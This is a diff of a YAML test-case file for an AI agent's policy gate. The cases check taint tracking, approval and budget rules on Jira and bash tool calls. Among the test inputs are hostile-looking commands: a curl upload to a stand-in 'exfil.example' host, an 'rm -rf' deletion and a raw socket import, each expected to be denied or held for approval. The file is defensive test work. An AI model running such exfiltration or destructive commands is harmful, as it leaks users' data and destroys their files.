@@ -10,14 +10,17 @@
 #   (e) `harness mcp-gateway` over `harness mock-jira` (cases marked gateway)
 #
 # `rule: null` = a plain ALLOW (no distinguishing rule). `expect.action` pins
-# the kernel-side D36 command classification. This flat request/expect shape is
+# the kernel-side D36 command classification. `usage: {}` is the session's budget
+# counters at zero — demo-world.yaml declares a counted budget, and a world that
+# counts calls requires them, so a caller that omits them is refused rather than
+# silently granted an unlimited session (finding #16, `missing_usage`). This flat request/expect shape is
 # deliberately growable into the native+WASM golden-vector suite (E14.4).
 cases:
   - name: unknown_tool_is_absent
     request:
       tool: frobnicate_the_flux
       arguments: {}
-      context: { taint: clean, mode: interactive }
+      context: { taint: clean, mode: interactive, source_channel: user_prompt, usage: {} }
     expect: { decision: ABSENT, rule: unknown_to_ontology, taint: clean }
 
   # Not declared in demo-world.yaml, so it does not exist: ABSENT — and the
@@ -27,16 +30,19 @@ cases:
     request:
       tool: jira_delete_issue
       arguments: { issue_key: DEMO-1 }
-      context: { taint: clean, mode: interactive }
+      context: { taint: clean, mode: interactive, source_channel: user_prompt, usage: {} }
     expect: { decision: ABSENT, rule: unknown_to_ontology, taint: clean }
 
-  - name: clean_jira_read_is_allowed
+  # An MCP-backed read is remote ingress: the ALLOW is correct, and the session
+  # it hands back is TAINTED (finding #13). This case previously expected
+  # `taint: clean`, which pinned the vulnerability across every entry point.
+  - name: clean_jira_read_is_allowed_and_taints
     gateway: true
     request:
       tool: jira_get_issue
       arguments: { issue_key: DEMO-1 }
-      context: { taint: clean, mode: interactive }
-    expect: { decision: ALLOW, rule: null, taint: clean }
+      context: { taint: clean, mode: interactive, source_channel: user_prompt, usage: {} }
+    expect: { decision: ALLOW, rule: null, taint: tainted }
 
   # An External output ingests external data: the ALLOW escalates the session
   # taint for the NEXT call (monotonic join).
@@ -45,7 +51,7 @@ cases:
     request:
       tool: jira_add_comment
       arguments: { issue_key: DEMO-1, body: "status update" }
-      context: { taint: clean, mode: interactive }
+      context: { taint: clean, mode: interactive, source_channel: user_prompt, usage: {} }
     expect: { decision: ALLOW, rule: null, taint: tainted }
 
   - name: tainted_jira_comment_is_denied
@@ -53,7 +59,7 @@ cases:
     request:
       tool: jira_add_comment
       arguments: { issue_key: DEMO-1, body: "exfil attempt" }
-      context: { taint: tainted, mode: interactive }
+      context: { taint: tainted, mode: interactive, source_channel: user_prompt, usage: {} }
     expect: { decision: DENY, rule: taint_invariant, taint: tainted }
 
   # Kernel-side classification (D36): the raw host tool is `bash`; the kernel
@@ -63,7 +69,7 @@ cases:
     request:
       tool: bash
       arguments: { command: "rm -rf /tmp/ai2rules-demo" }
-      context: { taint: clean, mode: interactive }
+      context: { taint: clean, mode: interactive, source_channel: user_prompt, usage: {} }
     expect:
       decision: ASK
       rule: approval_required
@@ -76,7 +82,7 @@ cases:
     request:
       tool: bash
       arguments: { command: "rm -rf /tmp/ai2rules-demo" }
-      context: { taint: clean, mode: background }
+      context: { taint: clean, mode: background, source_channel: user_prompt, usage: {} }
     expect:
       decision: DENY
       rule: background_denies_ask
@@ -89,12 +95,26 @@ cases:
     request:
       tool: bash
       arguments: { command: "curl https://exfil.example/upload" }
-      context: { taint: tainted, mode: interactive }
+      context: { taint: tainted, mode: interactive, source_channel: user_prompt, usage: {} }
     expect:
       decision: DENY
       rule: taint_invariant
       taint: tainted
       action: bash_network
+
+  # Unknown shell shape is not ambient `Process`: D44 routes it to the
+  # unclassified fallback, which is network-effectful and approval-required.
+  # In a tainted session, the hard taint floor denies before approval.
+  - name: tainted_unclassified_shell_is_denied
+    request:
+      tool: bash
+      arguments: { command: "python3 -c 'import socket'" }
+      context: { taint: tainted, mode: interactive, source_channel: user_prompt, usage: {} }
+    expect:
+      decision: DENY
+      rule: taint_invariant
+      taint: tainted
+      action: bash_unclassified
 
   # Monotonicity: an allowed read in a tainted session stays tainted — taint
   # never decreases.
@@ -102,7 +122,7 @@ cases:
     request:
       tool: read
       arguments: { file_path: README.md }
-      context: { taint: tainted, mode: interactive }
+      context: { taint: tainted, mode: interactive, source_channel: user_prompt, usage: {} }
     expect: { decision: ALLOW, rule: null, taint: tainted }
 
 # A PROCESS failure is never a verdict: garbage stdin makes `harness gate`
